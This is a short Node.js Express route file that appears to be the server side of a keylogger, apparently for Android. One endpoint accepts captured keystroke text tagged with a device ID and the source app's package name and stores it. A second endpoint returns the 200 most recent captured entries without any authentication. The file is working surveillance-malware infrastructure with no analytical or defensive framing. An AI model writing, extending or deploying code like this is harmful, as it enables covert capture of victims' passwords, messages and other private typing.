const express = require('express');
const router = express.Router();
const Keylog = require('../models/Keylog');

// Send Keylog
router.post('/keylog', async (req, res) => {
  try {
    const { deviceId, appPackage, text, timestamp } = req.body;
    await Keylog.create({ 
      deviceId, 
      appPackage, 
      text: text?.substring(0, 1000), 
      timestamp: timestamp || new Date() 
    });
    console.log(`🔑 Keylog saved from ${appPackage}`);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get Keylogs
router.get('/keylogs', async (req, res) => {
  try {
    const keylogs = await Keylog.find().sort({ timestamp: -1 }).limit(200);
    res.json({ success: true, data: keylogs });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;